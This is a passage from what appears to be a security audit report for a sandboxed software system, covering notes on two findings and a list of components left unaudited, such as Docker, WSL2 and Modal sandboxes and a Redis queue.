- F2 and F20 change behavior the least predictably. F2 starts from a test that may show the finding is wrong. F20 can be shipped behind a flag if the prompt volume is too high.

## Not in scope

- The Docker, WSL2 and Modal sandboxes, the per-state flow files, the Redis queue and bus, and the web pages beyond the proxy were not audited. Treat them as unreviewed, not clean.
- A Windows Firewall rule per sandboxed program is already a recorded decision (D3b, 2026-10-27).
